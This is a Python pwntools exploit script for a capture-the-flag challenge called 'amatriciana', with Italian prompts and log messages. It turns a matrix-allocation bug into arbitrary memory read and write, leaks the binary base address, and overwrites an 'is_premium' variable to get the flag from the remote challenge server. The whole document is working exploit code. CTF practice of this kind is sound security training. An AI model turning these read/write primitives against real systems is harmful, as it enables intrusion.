from pwn import ELF, context, process, ui, log, u64, p64, args, remote
from struct import pack as spack, unpack as sunpack
from pathlib import Path

wd = Path(__file__).parent.resolve()
exe = context.binary = ELF(wd / "amatriciana")
remotehost = ("amatriciana.challs.olicyber.it", 12302)


def menu(io, choice: int):
    io.recvuntil(b"8) Esci\n")
    io.sendline(f"{choice}".encode())


def newmat(io, rows: int, cols: int, name: str):
    menu(io, 0)
    io.sendlineafter(b"colonne?", f"{rows} {cols}".encode())
    io.sendlineafter(b"a questa matrice?\n", name.encode())
    io.recvuntil(b"successo\n")
    io.recvuntil(b"nrows: ")
    return int(io.recvline(False).decode(), 16)


def print_mat_short(io, nmat: int):
    menu(io, 2)
    io.sendlineafter(b"quale matrice?\n", f"{nmat}")
    return io.recvline()


def arb_read(addr: int):
    log.info(f"leggo all'indirizzo {addr:#018x}")
    if addr % 8 != 0:
        log.error("vogliamo indirizzi multipli di sizeof(double) = 8")
    addr //= 8
    menu(io, 3)
    io.sendlineafter(b"matrice?", f"{bigmat}".encode())
    row = addr // bigrow
    col = addr % bigrow
    log.debug(f"requesting pos {row:#x} {col:#x}")
    io.sendlineafter(b"elemento?\n", f"{row} {col}".encode())
    return io.recvline(False)


def arb_write(addr: int, value: int):
    if addr % 8 != 0:
        log.error("vogliamo indirizzi allineati a 8")
    addr //= 8
    menu(io, 4)
    io.sendlineafter(b"matrice?", f"{bigmat}".encode())
    row = addr // bigrow
    col = addr % bigrow
    log.debug(f"requesting pos {row:#x} {col:#x}")
    io.sendlineafter(b"elemento?", f"{row} {col}".encode())

    sending = sunpack("<d", p64(value))[0]
    io.sendline(f"{sending:.20e}".encode())


def get_flag(io):
    menu(io, 6)
    io.sendlineafter(b"matrici?\n", b"0 1")
    io.recvuntil(b"accontentati\n")
    flag = io.recvline(False)
    log.success(f"flag: {flag.decode()}")
    return flag

if __name__ == "__main__":
    io = remote(*remotehost)
    try:
        addr = newmat(io, 1, 1, "cusumano")
        log.info(f"leaked addr: {addr:#016x}")
        
        bigrow = (1 << 30)
        bigmat = 1
        newmat(io, bigrow, bigrow, "manuele")
        
        leaked = arb_read(addr + 0x60)
        log.info(f"raw leaked data: {leaked}")
        
        leak_addr = u64(spack("<d", float(leaked)))
        log.info(f"converted to addr: {leak_addr:#016x}")
        
        if leak_addr == 0:
            log.error("fallito come te")
        else:
            exe.address = leak_addr - exe.sym.main
            log.success(f"base address: {exe.address:#016x}")
            arb_write(exe.sym.is_premium, 1)
            get_flag(io)
    finally:
        io.close()